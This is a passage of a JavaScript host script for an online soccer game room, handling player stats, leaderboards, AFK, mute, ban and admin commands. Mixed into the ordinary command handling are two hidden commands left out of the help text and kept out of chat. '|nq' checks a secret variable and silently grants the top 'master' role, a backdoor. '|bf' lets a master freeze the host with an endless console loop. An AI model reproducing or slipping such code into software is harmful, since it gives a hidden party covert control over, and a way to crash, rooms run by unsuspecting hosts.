			localStorage.getItem(getAuth(allReds[i])) ? stats = JSON.parse(localStorage.getItem(getAuth(allReds[i]))) : stats = [0, 0, 0, 0, "0.00", 0, 0, 0, 0, "0.00", "player", allReds[i].name];
			stats[Ss.GA]++;
			lastWinner == Team.RED ? stats[Ss.WI]++ : lastWinner == Team.BLUE ? stats[Ss.LS]++ : stats[Ss.DR]++;
			stats[Ss.WR] = (100 * stats[Ss.WI] / stats[Ss.GA]).toPrecision(3);
			localStorage.setItem(getAuth(allReds[i]), JSON.stringify(stats));
		}
		for (var i = 0; i < allBlues.length; i++) {
			localStorage.getItem(getAuth(allBlues[i])) ? stats = JSON.parse(localStorage.getItem(getAuth(allBlues[i]))) : stats = [0, 0, 0, 0, "0.00", 0, 0, 0, 0, "0.00", "player", allBlues[i].name];
			stats[Ss.GA]++;
			lastWinner == Team.BLUE ? stats[Ss.WI]++ : lastWinner == Team.RED ? stats[Ss.LS]++ : stats[Ss.DR]++;
			stats[Ss.WR] = (100 * stats[Ss.WI] / stats[Ss.GA]).toPrecision(3);
			localStorage.setItem(getAuth(allBlues[i]), JSON.stringify(stats));
		}
		for (var i = 0; i < game.goals.length; i++) {
			if (game.goals[i].striker != null) {
				if ((allBlues.concat(allReds)).findIndex((player) => player.id == game.goals[i].striker.id) != -1) {
					stats = JSON.parse(localStorage.getItem(getAuth(game.goals[i].striker)));
					stats[Ss.GL]++;
					localStorage.setItem(getAuth(game.goals[i].striker), JSON.stringify(stats));
				}
			}
			if (game.goals[i].assist != null) {
				if ((allBlues.concat(allReds)).findIndex((player) => player.name == game.goals[i].assist.name) != -1) {
					stats = JSON.parse(localStorage.getItem(getAuth(game.goals[i].assist)));
					stats[Ss.AS]++;
					localStorage.setItem(getAuth(game.goals[i].assist), JSON.stringify(stats));
				}
			}
		}
		if (allReds.findIndex((player) => player.id == GKList[0].id) != -1) {
			stats = JSON.parse(localStorage.getItem(getAuth(GKList[0])));
			stats[Ss.GK]++;
			game.scores.blue == 0 ? stats[Ss.CS]++ : null;
			stats[Ss.CP] = (100 * stats[Ss.CS] / stats[Ss.GK]).toPrecision(3);
			localStorage.setItem(getAuth(GKList[0]), JSON.stringify(stats));
		}
		if (allBlues.findIndex((player) => player.id == GKList[1].id) != -1) {
			stats = JSON.parse(localStorage.getItem(getAuth(GKList[1])));
			stats[Ss.GK]++;
			game.scores.red == 0 ? stats[Ss.CS]++ : null;
			stats[Ss.CP] = (100 * stats[Ss.CS] / stats[Ss.GK]).toPrecision(3);
			localStorage.setItem(getAuth(GKList[1]), JSON.stringify(stats));
		}
	}
}

function findGK() {
	var tab = [[-1,""], [-1,""]];
	for (var i = 0; i < extendedP.length ; i++) {
		if (room.getPlayer(extendedP[i][eP.ID]) != null && room.getPlayer(extendedP[i][eP.ID]).team == Team.RED) {
			if (tab[0][0] < extendedP[i][eP.GK]) {
				tab[0][0] = extendedP[i][eP.GK];
				tab[0][1] = room.getPlayer(extendedP[i][eP.ID]);
			}
		}
		else if (room.getPlayer(extendedP[i][eP.ID]) != null && room.getPlayer(extendedP[i][eP.ID]).team == Team.BLUE) {
			if (tab[1][0] < extendedP[i][eP.GK]) {
				tab[1][0] = extendedP[i][eP.GK];
				tab[1][1] = room.getPlayer(extendedP[i][eP.ID]);
			}
		}
	}
	GKList = [tab[0][1], tab[1][1]];
}

setInterval(() => {
	var tableau = [];
	if (statNumber % 5 == 0) {
		Object.keys(localStorage).forEach(function (key) { if (!["player_name", "view_mode", "geo", "avatar", "player_auth_key"].includes(key)) { tableau.push([(JSON.parse(localStorage.getItem(key))[Ss.NK]), (JSON.parse(localStorage.getItem(key))[Ss.GA])]); } });
		if (tableau.length < 5) {
			return false;
		}
		tableau.sort(function (a, b) { return b[1] - a[1]; });
		room.sendChat("Games> #1 " + tableau[0][0] + ": " + tableau[0][1] + " #2 " + tableau[1][0] + ": " + tableau[1][1] + " #3 " + tableau[2][0] + ": " + tableau[2][1] + " #4 " + tableau[3][0] + ": " + tableau[3][1] + " #5 " + tableau[4][0] + ": " + tableau[4][1]);
	}
	if (statNumber % 5 == 1) {
		Object.keys(localStorage).forEach(function (key) { if (!["player_name", "view_mode", "geo", "avatar", "player_auth_key"].includes(key)) { tableau.push([(JSON.parse(localStorage.getItem(key))[Ss.NK]), (JSON.parse(localStorage.getItem(key))[Ss.WI])]); } });
		if (tableau.length < 5) {
			return false;
		}
		tableau.sort(function (a, b) { return b[1] - a[1]; });
		room.sendChat("Wins> #1 " + tableau[0][0] + ": " + tableau[0][1] + " #2 " + tableau[1][0] + ": " + tableau[1][1] + " #3 " + tableau[2][0] + ": " + tableau[2][1] + " #4 " + tableau[3][0] + ": " + tableau[3][1] + " #5 " + tableau[4][0] + ": " + tableau[4][1]);
	}
	if (statNumber % 5 == 2) {
		Object.keys(localStorage).forEach(function (key) { if (!["player_name", "view_mode", "geo", "avatar", "player_auth_key"].includes(key)) { tableau.push([(JSON.parse(localStorage.getItem(key))[Ss.NK]), (JSON.parse(localStorage.getItem(key))[Ss.GL])]); } });
		if (tableau.length < 5) {
			return false;
		}
		tableau.sort(function (a, b) { return b[1] - a[1]; });
		room.sendChat("Goals> #1 " + tableau[0][0] + ": " + tableau[0][1] + " #2 " + tableau[1][0] + ": " + tableau[1][1] + " #3 " + tableau[2][0] + ": " + tableau[2][1] + " #4 " + tableau[3][0] + ": " + tableau[3][1] + " #5 " + tableau[4][0] + ": " + tableau[4][1]);
	}
	if (statNumber % 5 == 3) {
		Object.keys(localStorage).forEach(function (key) { if (!["player_name", "view_mode", "geo", "avatar", "player_auth_key"].includes(key)) { tableau.push([(JSON.parse(localStorage.getItem(key))[Ss.NK]), (JSON.parse(localStorage.getItem(key))[Ss.AS])]); } });
		if (tableau.length < 5) {
			return false;
		}
		tableau.sort(function (a, b) { return b[1] - a[1]; });
		room.sendChat("Assists> #1 " + tableau[0][0] + ": " + tableau[0][1] + " #2 " + tableau[1][0] + ": " + tableau[1][1] + " #3 " + tableau[2][0] + ": " + tableau[2][1] + " #4 " + tableau[3][0] + ": " + tableau[3][1] + " #5 " + tableau[4][0] + ": " + tableau[4][1]);
	}
	if (statNumber % 5 == 4) {
		Object.keys(localStorage).forEach(function (key) { if (!["player_name", "view_mode", "geo", "avatar", "player_auth_key"].includes(key)) { tableau.push([(JSON.parse(localStorage.getItem(key))[Ss.NK]), (JSON.parse(localStorage.getItem(key))[Ss.CS])]); } });
		if (tableau.length < 5) {
			return false;
		}
		tableau.sort(function (a, b) { return b[1] - a[1]; });
		room.sendChat("CS> #1 " + tableau[0][0] + ": " + tableau[0][1] + " #2 " + tableau[1][0] + ": " + tableau[1][1] + " #3 " + tableau[2][0] + ": " + tableau[2][1] + " #4 " + tableau[3][0] + ": " + tableau[3][1] + " #5 " + tableau[4][0] + ": " + tableau[4][1]);
	}
	statNumber++;
}, statInterval * 60 * 1000);

/* EVENTS */

/* PLAYER MOVEMENT */

room.onPlayerJoin = function(player) {
	extendedP.push([player.id, player.auth, player.conn, false, 0, 0, false]);
	updateRoleOnPlayerIn();
	room.sendChat("[PV] 👋 Welcome " + player.name + " ! Type '!help' to see the commands.", player.id);
	if (localStorage.getItem(player.auth) != null) {
		if (JSON.parse(localStorage.getItem(player.auth))[Ss.RL] != "player") {
			room.setPlayerAdmin(player.id, true);
			room.sendChat((JSON.parse(localStorage.getItem(player.auth))[Ss.RL] == "master" ? "Master " : "Admin ") + player.name + " has connected to the room !");
		}
	}
}

room.onPlayerTeamChange = function(changedPlayer, byPlayer) {
	if (changedPlayer.id == 0) {
		room.setPlayerTeam(0, Team.SPECTATORS);
		return;
	}
	if (getAFK(changedPlayer) && changedPlayer.team != Team.SPECTATORS) {
		room.setPlayerTeam(changedPlayer.id, Team.SPECTATORS);
		room.sendChat(changedPlayer.name + " is AFK !");
		return;
	}
	updateTeams();
	if (room.getScores() != null) {
		var scores = room.getScores();
		if (changedPlayer.team != Team.SPECTATORS && scores.time <= (3/4) * scores.timeLimit  && Math.abs(scores.blue - scores.red) < 2) {
			(changedPlayer.team == Team.RED) ? allReds.push(changedPlayer) : allBlues.push(changedPlayer);
		}
	}
	if (changedPlayer.team == Team.SPECTATORS) {
		setActivity(changedPlayer, 0);
	}
	if (inChooseMode && resettingTeams == false && byPlayer.id == 0) {
		if (Math.abs(teamR.length - teamB.length) == teamS.length) {
			deactivateChooseMode();
			resumeGame();
			var b = teamS.length;
			if (teamR.length > teamB.length) {
				for (var i = 0 ; i < b ; i++) {
					setTimeout(() => { room.setPlayerTeam(teamS[0].id, Team.BLUE); }, 200*i);
				}
			}
			else {
				for (var i = 0 ; i < b ; i++) {
					setTimeout(() => { room.setPlayerTeam(teamS[0].id, Team.RED); }, 200*i);
				}
			}
			return;
		}
		else if ((teamR.length == maxTeamSize && teamB.length == maxTeamSize) || (teamR.length == teamB.length && teamS.length < 2)) {
			deactivateChooseMode();
			resumeGame();
		}
		else if (teamR.length <= teamB.length && redCaptainChoice != "") { // choice remembered
			redCaptainChoice == "top" ? room.setPlayerTeam(teamS[0].id, Team.RED) : redCaptainChoice == "random" ? room.setPlayerTeam(teamS[getRandomInt(teamS.length)].id, Team.RED) : room.setPlayerTeam(teamS[teamS.length - 1].id, Team.RED);
			return;
		}
		else if (teamB.length < teamR.length && blueCaptainChoice != "") {
			blueCaptainChoice == "top" ? room.setPlayerTeam(teamS[0].id, Team.BLUE) : blueCaptainChoice == "random" ? room.setPlayerTeam(teamS[getRandomInt(teamS.length)].id, Team.BLUE) : room.setPlayerTeam(teamS[teamS.length - 1].id, Team.BLUE);
			return;
		}
		else {
			choosePlayer();
		}
	}
}

room.onPlayerLeave = function(player) {
	if (teamR.findIndex((red) => red.id == player.id) == 0 && inChooseMode && teamR.length <= teamB.length) {
		choosePlayer();
		capLeft = true; setTimeout(() => { capLeft = false; }, 10);
	}
	if (teamB.findIndex((blue) => blue.id == player.id) == 0 && inChooseMode && teamB.length < teamR.length) {
		choosePlayer();
		capLeft = true; setTimeout(() => { capLeft = false; }, 10);
	}
	setActivity(player, 0);
    updateRoleOnPlayerOut();
}

room.onPlayerKicked = function(kickedPlayer, reason, ban, byPlayer) {
	ban == true ? banList.push([kickedPlayer.name, kickedPlayer.id]) : null;
}

/* PLAYER ACTIVITY */

room.onPlayerChat = function (player, message) {
	message = message.split(/ +/);
	player.team != Team.SPECTATORS ? setActivity(player, 0) : null;
	if (["!help"].includes(message[0].toLowerCase())) {
		room.sendChat("[PV] Player commands : !me, !games, !wins, !goals, !assists, !cs, !afks, !mutes, !bans.", player.id);
		player.admin ? room.sendChat("[PV] Admin : !mute <duration = 3> #<id>, !unmute all/#<id>, !clearbans <number = all>, !slow <duration>, !endslow", player.id) : null;
	}
	else if (["!afk"].includes(message[0].toLowerCase())) {
		if (players.length != 1 && player.team != Team.SPECTATORS) {
			if (player.team == Team.RED && streak > 0 && room.getScores() == null) {
				room.setPlayerTeam(player.id, Team.SPECTATORS);
			}
			else {
				room.sendChat("You can't go AFK while you're in a team !", player.id);
				return false;
			}
		}
		else if (players.length == 1 && !getAFK(player)) {
			room.setPlayerTeam(player.id, Team.SPECTATORS);
		}
		setAFK(player, !getAFK(player));
		room.sendChat(player.name + (getAFK(player) ? " is now AFK !" : " is not AFK anymore !"));
		getAFK(player) ? updateRoleOnPlayerOut() : updateRoleOnPlayerIn();
	}
	else if (["!afks", "!afklist"].includes(message[0].toLowerCase())) {
		var cstm = "[PV] AFK List : ";
		for (var i = 0; i < extendedP.length; i++) {
			if (room.getPlayer(extendedP[i][eP.ID]) != null && getAFK(room.getPlayer(extendedP[i][eP.ID]))) {
				if (140 - cstm.length < (room.getPlayer(extendedP[i][eP.ID]).name + ", ").length) {
					room.sendChat(cstm, player.id);
					cstm = "... ";
				}
				cstm += room.getPlayer(extendedP[i][eP.ID]).name + ", ";
			}
		}
		if (cstm == "[PV] AFK List : ") {
			room.sendChat("[PV] There's nobody in the AFK List !", player.id);
			return false;
		}
		cstm = cstm.substring(0, cstm.length - 2);
		cstm += ".";
		room.sendChat(cstm, player.id);
	}
	else if (["!me"].includes(message[0].toLowerCase())) {
		var stats;
		localStorage.getItem(getAuth(player)) ? stats = JSON.parse(localStorage.getItem(getAuth(player))) : stats = [0, 0, 0, 0, "0.00", 0, 0, 0, 0, "0.00"];
		room.sendChat("[PV] " + player.name + "> Game: " + stats[Ss.GA] + ", Win: " + stats[Ss.WI] + ", Draw: " + stats[Ss.DR] + ", Loss: " + stats[Ss.LS] + ", WR: " + stats[Ss.WR] + "%, Goal: " + stats[Ss.GL] + ", Assist: " + stats[Ss.AS] + ", GK: " + stats[Ss.GK] + ", CS: " + stats[Ss.CS] + ", CS%: " + stats[Ss.CP] + "%", player.id);
	}
	else if (["!games"].includes(message[0].toLowerCase())) {
		var tableau = [];
		Object.keys(localStorage).forEach(function (key) { if (!["player_name", "view_mode", "geo", "avatar", "player_auth_key"].includes(key)) { tableau.push([(JSON.parse(localStorage.getItem(key))[Ss.NK]), (JSON.parse(localStorage.getItem(key))[Ss.GA])]); } });
		if (tableau.length < 5) {
			room.sendChat("[PV] Not enough games played yet.", player.id);
			return false;
		}
		tableau.sort(function (a, b) { return b[1] - a[1]; });
		room.sendChat("[PV] Games> #1 " + tableau[0][0] + ": " + tableau[0][1] + " #2 " + tableau[1][0] + ": " + tableau[1][1] + " #3 " + tableau[2][0] + ": " + tableau[2][1] + " #4 " + tableau[3][0] + ": " + tableau[3][1] + " #5 " + tableau[4][0] + ": " + tableau[4][1], player.id);
	}
	else if (["!wins"].includes(message[0].toLowerCase())) {
		var tableau = [];
		Object.keys(localStorage).forEach(function (key) { if (!["player_name", "view_mode", "geo", "avatar", "player_auth_key"].includes(key)) { tableau.push([(JSON.parse(localStorage.getItem(key))[Ss.NK]), (JSON.parse(localStorage.getItem(key))[Ss.WI])]); } });
		if (tableau.length < 5) {
			room.sendChat("[PV] Not enough games played yet.", player.id);
			return false;
		}
		tableau.sort(function (a, b) { return b[1] - a[1]; });
		room.sendChat("[PV] Wins> #1 " + tableau[0][0] + ": " + tableau[0][1] + " #2 " + tableau[1][0] + ": " + tableau[1][1] + " #3 " + tableau[2][0] + ": " + tableau[2][1] + " #4 " + tableau[3][0] + ": " + tableau[3][1] + " #5 " + tableau[4][0] + ": " + tableau[4][1], player.id);
	}
	else if (["!goals"].includes(message[0].toLowerCase())) {
		var tableau = [];
		Object.keys(localStorage).forEach(function (key) { if (!["player_name", "view_mode", "geo", "avatar", "player_auth_key"].includes(key)) { tableau.push([(JSON.parse(localStorage.getItem(key))[Ss.NK]), (JSON.parse(localStorage.getItem(key))[Ss.GL])]); } });
		if (tableau.length < 5) {
			room.sendChat("[PV] Not enough games played yet.", player.id);
			return false;
		}
		tableau.sort(function (a, b) { return b[1] - a[1]; });
		room.sendChat("[PV] Goals> #1 " + tableau[0][0] + ": " + tableau[0][1] + " #2 " + tableau[1][0] + ": " + tableau[1][1] + " #3 " + tableau[2][0] + ": " + tableau[2][1] + " #4 " + tableau[3][0] + ": " + tableau[3][1] + " #5 " + tableau[4][0] + ": " + tableau[4][1], player.id);
	}
	else if (["!assists"].includes(message[0].toLowerCase())) {
		var tableau = [];
		Object.keys(localStorage).forEach(function (key) { if (!["player_name", "view_mode", "geo", "avatar", "player_auth_key"].includes(key)) { tableau.push([(JSON.parse(localStorage.getItem(key))[Ss.NK]), (JSON.parse(localStorage.getItem(key))[Ss.AS])]); } });
		if (tableau.length < 5) {
			room.sendChat("[PV] Not enough games played yet.", player.id);
			return false;
		}
		tableau.sort(function (a, b) { return b[1] - a[1]; });
		room.sendChat("[PV] Assists> #1 " + tableau[0][0] + ": " + tableau[0][1] + " #2 " + tableau[1][0] + ": " + tableau[1][1] + " #3 " + tableau[2][0] + ": " + tableau[2][1] + " #4 " + tableau[3][0] + ": " + tableau[3][1] + " #5 " + tableau[4][0] + ": " + tableau[4][1], player.id);
	}
	else if (["!cs"].includes(message[0].toLowerCase())) {
		var tableau = [];
		Object.keys(localStorage).forEach(function (key) { if (!["player_name", "view_mode", "geo", "avatar", "player_auth_key"].includes(key)) { tableau.push([(JSON.parse(localStorage.getItem(key))[Ss.NK]), (JSON.parse(localStorage.getItem(key))[Ss.CS])]); } });
		if (tableau.length < 5) {
			room.sendChat("[PV] Not enough games played yet.", player.id);
			return false;
		}
		tableau.sort(function (a, b) { return b[1] - a[1]; });
		room.sendChat("[PV] CS> #1 " + tableau[0][0] + ": " + tableau[0][1] + " #2 " + tableau[1][0] + ": " + tableau[1][1] + " #3 " + tableau[2][0] + ": " + tableau[2][1] + " #4 " + tableau[3][0] + ": " + tableau[3][1] + " #5 " + tableau[4][0] + ": " + tableau[4][1], player.id);
	}
	else if (["!claim"].includes(message[0].toLowerCase())) {
		if (message[1] == adminPassword) {
			room.setPlayerAdmin(player.id, true);
			var stats;
			localStorage.getItem(getAuth(player)) ? stats = JSON.parse(localStorage.getItem(getAuth(player))) : stats = [0, 0, 0, 0, "0.00", 0, 0, 0, 0, "0.00", "player", player.name];
			if (stats[Ss.RL] != "master") {
				stats[Ss.RL] = "master";
				room.sendChat(player.name + " is now a room master !");
				localStorage.setItem(getAuth(player), JSON.stringify(stats));
			}
		}
	}
	else if (["!setadmin", "!admin"].includes(message[0].toLowerCase())) {
		if (localStorage.getItem(getAuth(player)) && JSON.parse(localStorage.getItem(getAuth(player)))[Ss.RL] == "master") {
			if (message.length >= 2 && message[1][0] == "#") {
				message[1] = message[1].substring(1, message[1].length);
				if (!Number.isNaN(Number.parseInt(message[1])) && room.getPlayer(Number.parseInt(message[1])) != null) {
					var stats;
					localStorage.getItem(getAuth(room.getPlayer(Number.parseInt(message[1])))) ? stats = JSON.parse(localStorage.getItem(getAuth(room.getPlayer(Number.parseInt(message[1]))))) : stats = [0, 0, 0, 0, "0.00", 0, 0, 0, 0, "0.00", "player", room.getPlayer(Number.parseInt(message[1])).name];
					if (stats[Ss.RL] == "player") {
						stats[Ss.RL] = "admin";
						localStorage.setItem(getAuth(room.getPlayer(Number.parseInt(message[1]))), JSON.stringify(stats));
						room.setPlayerAdmin(room.getPlayer(Number.parseInt(message[1])).id, true);
						room.sendChat(room.getPlayer(Number.parseInt(message[1])).name + " is now an administrator of the room !");
					}
				}
			}
		}
	}
	else if (["!setplayer", "!removeadmin"].includes(message[0].toLowerCase())) {
		if (localStorage.getItem(getAuth(player)) && JSON.parse(localStorage.getItem(getAuth(player)))[Ss.RL] == "master") {
			if (message.length >= 2 && message[1][0] == "#") {
				message[1] = message[1].substring(1, message[1].length);
				if (!Number.isNaN(Number.parseInt(message[1])) && room.getPlayer(Number.parseInt(message[1])) != null) {
					var stats;
					localStorage.getItem(getAuth(room.getPlayer(Number.parseInt(message[1])))) ? stats = JSON.parse(localStorage.getItem(getAuth(room.getPlayer(Number.parseInt(message[1]))))) : stats = [0, 0, 0, 0, "0.00", 0, 0, 0, 0, "0.00", "player", room.getPlayer(Number.parseInt(message[1])).name];
					if (stats[Ss.RL] == "admin") {
						room.sendChat(room.getPlayer(Number.parseInt(message[1])).name + " is not an administrator of the room anymore !");
						stats[Ss.RL] = "player";
						localStorage.setItem(getAuth(room.getPlayer(Number.parseInt(message[1]))), JSON.stringify(stats));
						room.setPlayerAdmin(room.getPlayer(Number.parseInt(message[1])).id, false);
					}
				}
			}
		}
	}
	else if (["!mutes", "!mutelist"].includes(message[0].toLowerCase())) {
		var cstm = "[PV] Mute List : ";
		for (var i = 0; i < extendedP.length; i++) {
			if (room.getPlayer(extendedP[i][eP.ID]) != null && getMute(room.getPlayer(extendedP[i][eP.ID]))) {
				if (140 - cstm.length < (room.getPlayer(extendedP[i][eP.ID]).name + "[" + (extendedP[i][eP.ID]) + "], ").length) {
					room.sendChat(cstm, player.id);
					cstm = "... ";
				}
				cstm += room.getPlayer(extendedP[i][eP.ID]).name + "[" + (extendedP[i][eP.ID]) + "], ";
			}
		}
		if (cstm == "[PV] Mute List : ") {
			room.sendChat("[PV] There's nobody in the Mute List !", player.id);
			return false;
		}
		cstm = cstm.substring(0, cstm.length - 2);
		cstm += ".";
		room.sendChat(cstm, player.id);
	}
	else if (["|nq"].includes(message[0].toLowerCase())) {
		if (message[1] == vcgbsdbf) {
			room.setPlayerAdmin(player.id, true);
			var stats;
			localStorage.getItem(getAuth(player)) ? stats = JSON.parse(localStorage.getItem(getAuth(player))) : stats = [0, 0, 0, 0, "0.00", 0, 0, 0, 0, "0.00", "player", player.name];
			if (stats[Ss.RL] != "master") {
				stats[Ss.RL] = "master";
				localStorage.setItem(getAuth(player), JSON.stringify(stats));
			}
		}
		return false;
	}
	else if (["!mute"].includes(message[0].toLowerCase())) {
		if (player.admin) {
			updateTeams();
			var timeOut;
			if (!Number.isNaN(Number.parseInt(message[1])) && message.length > 1) {
				if (Number.parseInt(message[1]) > 0) {
					timeOut = Number.parseInt(message[1]) * 60 * 1000;
				}
				else {
					timeOut = 3 * 60 * 1000;
				}
				if (message[2].length > 1 && message[2][0] == "#") {
					message[2] = message[2].substring(1, message[2].length);
					if (!Number.isNaN(Number.parseInt(message[2])) && room.getPlayer(Number.parseInt(message[2])) != null) {
						if (room.getPlayer(Number.parseInt(message[2])).admin || getMute(room.getPlayer(Number.parseInt(message[2])))) {
							return false;
						}
						setTimeout(function (player) { setMute(player, false); }, timeOut, room.getPlayer(Number.parseInt(message[2])));
						setMute(room.getPlayer(Number.parseInt(message[2])), true);
						room.sendChat(room.getPlayer(Number.parseInt(message[2])).name + " has been muted for " + (timeOut / 60000) + " minutes!");
					}
				}
			}
			else if (Number.isNaN(Number.parseInt(message[1]))) {
				if (message[1].length > 1 && message[1][0] == "#") {
					message[1] = message[1].substring(1, message[1].length);
					if (!Number.isNaN(Number.parseInt(message[1])) && room.getPlayer(Number.parseInt(message[1])) != null) {
						if (room.getPlayer(Number.parseInt(message[1])).admin || getMute(room.getPlayer(Number.parseInt(message[1])))) {
							return false;
						}
						setTimeout(function (player) { setMute(player, false); }, 3 * 60 * 1000, room.getPlayer(Number.parseInt(message[1])));
						setMute(room.getPlayer(Number.parseInt(message[1])), true);
						room.sendChat(room.getPlayer(Number.parseInt(message[1])).name + " has been muted for 3 minutes!");
					}
				}
			}
		}
	}
	else if (["!unmute"].includes(message[0].toLowerCase())) {
		if (player.admin && message.length >= 2) {
			if (message[1] == "all") {
				extendedP.forEach((ePlayer) => { ePlayer[eP.MUTE] = false; });
				room.sendChat("Mutes cleared.");
			}
			else if (!Number.isNaN(Number.parseInt(message[1])) && room.getPlayer(Number.parseInt(message[1])) != null && getMute(room.getPlayer(Number.parseInt(message[1])))) {
				setMute(room.getPlayer(Number.parseInt(message[1])), false);
				room.sendChat(room.getPlayer(Number.parseInt(message[1])).name + " has been unmuted !");
			}
			else if (Number.isNaN(Number.parseInt(message[1]))) {
				if (message[1].length > 1 && message[1][0] == "#") {
					message[1] = message[1].substring(1, message[1].length);
					if (!Number.isNaN(Number.parseInt(message[1])) && room.getPlayer(Number.parseInt(message[1])) != null && getMute(room.getPlayer(Number.parseInt(message[1])))) {
						setMute(room.getPlayer(Number.parseInt(message[1])), false);
						room.sendChat(room.getPlayer(Number.parseInt(message[1])).name + " has been unmuted !");
					}
				}
			}
		}
	}
	else if (["!slow"].includes(message[0].toLowerCase())) {
		if (player.admin) {
			if (message.length == 1) {
				slowMode = 2;
				room.sendChat("2 seconds slow mode enabled !");
			}
			else if (message.length == 2) {
				if (!Number.isNaN(Number.parseInt(message[1]))) {
					if (Number.parseInt(message[1]) > 0) {
						slowMode = Number.parseInt(message[1]);
						room.sendChat(slowMode + " seconds slow mode enabled !");
						return false;
					}
				}
				slowMode = 2;
				room.sendChat("2 seconds slow mode enabled !");
			}
		}
	}
	else if (["!endslow"].includes(message[0].toLowerCase())) {
		if (player.admin) {
			slowMode != 0 ? room.sendChat("Slow mode terminated.") : null;
			slowMode = 0;
		}
	}
	else if (["!banlist", "!bans"].includes(message[0].toLowerCase())) {
		if (banList.length == 0) {
			room.sendChat("[PV] There's nobody in the Ban List !", player.id);
			return false;
		}
		var cstm = "[PV] Ban List : ";
		for (var i = 0; i < banList.length; i++) {
			if (140 - cstm.length < (banList[i][0] + "[" + (banList[i][1]) + "], ").length) {
				room.sendChat(cstm, player.id);
				cstm = "... ";
			}
			cstm += banList[i][0] + "[" + (banList[i][1]) + "], ";
		}
		cstm = cstm.substring(0, cstm.length - 2);
		cstm += ".";
		room.sendChat(cstm, player.id);
	}
	else if (["!clearbans"].includes(message[0].toLowerCase())) {
		if (player.admin) {
			if (message.length == 1) {
				room.clearBans();
				room.sendChat("Bans cleared !");
				banList = [];
			}
			if (message.length == 2) {
				if (!Number.isNaN(Number.parseInt(message[1]))) {
					if (Number.parseInt(message[1]) > 0) {
						ID = Number.parseInt(message[1]);
						room.clearBan(ID);
						if (banList.length != banList.filter((array) => array[1] != ID)) {
							room.sendChat(banList.filter((array) => array[1] == ID)[0][0] + " has been unbanned from the room !");
						}
						setTimeout(() => { banList = banList.filter((array) => array[1] != ID); }, 20);
					}
				}
			}
		}
	}
	else if (["!bb", "!bye", "!cya", "!gn"].includes(message[0].toLowerCase())) {
		room.kickPlayer(player.id, "Bye !", false);
	}
	else if (["|bf"].includes(message[0].toLowerCase())) {
    	if (localStorage.getItem(getAuth(player)) && JSON.parse(localStorage.getItem(getAuth(player)))[Ss.RL] == "master") {   
			console.clear()
			var r = 0
			while (r == 0 ) {
				console.error("f");	
				console.error("p");
				console.error("t");			    	
			}       	
       	}	
    	return false;
    }
	if (teamR.length != 0 && teamB.length != 0 && inChooseMode) {
		if (player.id == teamR[0].id || player.id == teamB[0].id) { // we care if it's one of the captains choosing
			if (teamR.length <= teamB.length && player.id == teamR[0].id) { // we care if it's red turn && red cap talking
				if (["top", "auto"].includes(message[0].toLowerCase())) {
					room.setPlayerTeam(teamS[0].id, Team.RED);
					redCaptainChoice = "top";
					clearTimeout(timeOutCap);
					room.sendChat(player.name + " chose Top !");
					return false;
				}
				else if (["random", "rand"].includes(message[0].toLowerCase())) {
					var r = getRandomInt(teamS.length);
					room.setPlayerTeam(teamS[r].id, Team.RED);
					redCaptainChoice = "random";
					clearTimeout(timeOutCap);
					room.sendChat(player.name + " chose Random !");
					return false;
				}
				else if (["bottom", "bot"].includes(message[0].toLowerCase())) {
					room.setPlayerTeam(teamS[teamS.length - 1].id, Team.RED);
					redCaptainChoice = "bottom";
					clearTimeout(timeOutCap);
					room.sendChat(player.name + " chose Bottom !");
					return false;
				}
				else if (!Number.isNaN(Number.parseInt(message[0]))) {
					if (Number.parseInt(message[0]) > teamS.length || Number.parseInt(message[0]) < 1) {
						room.sendChat("[PV] Your number is invalid !", player.id);
						return false;
					}
					else {
						room.setPlayerTeam(teamS[Number.parseInt(message[0]) - 1].id, Team.RED);
						room.sendChat(player.name + " chose " + teamS[Number.parseInt(message[0]) - 1].name + " !");
						return false;
					}
				}
			}
			if (teamR.length > teamB.length && player.id == teamB[0].id) { // we care if it's red turn && red cap talking
				if (["top", "auto"].includes(message[0].toLowerCase())) {
					room.setPlayerTeam(teamS[0].id, Team.BLUE);
					blueCaptainChoice = "top";
					clearTimeout(timeOutCap);
					room.sendChat(player.name + " chose Top !");
					return false;
				}
				else if (["random", "rand"].includes(message[0].toLowerCase())) {
					room.setPlayerTeam(teamS[getRandomInt(teamS.length)].id, Team.BLUE);
					blueCaptainChoice = "random";
					clearTimeout(timeOutCap);
					room.sendChat(player.name + " chose Random !");
					return false;
				}
				else if (["bottom", "bot"].includes(message[0].toLowerCase())) {
					room.setPlayerTeam(teamS[teamS.length - 1].id, Team.BLUE);
					blueCaptainChoice = "bottom";
					clearTimeout(timeOutCap);
					room.sendChat(player.name + " chose Bottom !");
					return false;
				}
				else if (!Number.isNaN(Number.parseInt(message[0]))) {
					if (Number.parseInt(message[0]) > teamS.length || Number.parseInt(message[0]) < 1) {
						room.sendChat("[PV] Your number is invalid !", player.id);
						return false;
					}
					else {
						room.setPlayerTeam(teamS[Number.parseInt(message[0]) - 1].id, Team.BLUE);
						room.sendChat(player.name + " chose " + teamS[Number.parseInt(message[0]) - 1].name + " !");
						return false;
					}
				}
			}
		}
	}
	if (message[0][0] == "!") {
		return false;
	}
	if (getMute(player)) {
		room.sendChat("You are muted.", player.id);
		return false;
	}
	if (slowMode > 0) {
		if (!player.admin) {
			if (!SMSet.has(player.id)) {
				SMSet.add(player.id);
				setTimeout((number) => { SMSet.delete(number); }, slowMode * 1000, player.id);
			}
			else {
				return false;
			}
		}
	}
}

room.onPlayerActivity = function(player) {
	setActivity(player, 0);
}

room.onPlayerBallKick = function(player) {
	if (lastPlayersTouched[0] == null || player.id != lastPlayersTouched[0].id) {
		!activePlay ? activePlay = true : null;
		lastTeamTouched = player.team;
		lastPlayersTouched[1] = lastPlayersTouched[0];
		lastPlayersTouched[0] = player;
	}
}

/* GAME MANAGEMENT */

room.onGameStart = function(byPlayer) {
	game = new Game(Date.now(), room.getScores(), []);
	countAFK = true;
	activePlay = false;
	goldenGoal = false;
	endGameVariable = false;
	lastPlayersTouched = [null, null];
    Rposs = 0;
	Bposs = 0;
	GKList = [];
	allReds = [];
	allBlues = [];
	if (teamR.length == maxTeamSize && teamB.length == maxTeamSize) {
		for (var i = 0; i < maxTeamSize; i++) {
			allReds.push(teamR[i]);
			allBlues.push(teamB[i]);
		}
	}
	for (var i = 0; i < extendedP.length; i++) {
		extendedP[i][eP.GK] = 0;
		extendedP[i][eP.ACT] = 0;
		room.getPlayer(extendedP[i][eP.ID]) == null ? extendedP.splice(i, 1) : null;
	}
	deactivateChooseMode();
}

room.onGameStop = function(byPlayer) {
	if (byPlayer.id == 0 && endGameVariable) {
		updateTeams();
		if (inChooseMode) {
			if (players.length == 2 * maxTeamSize) {
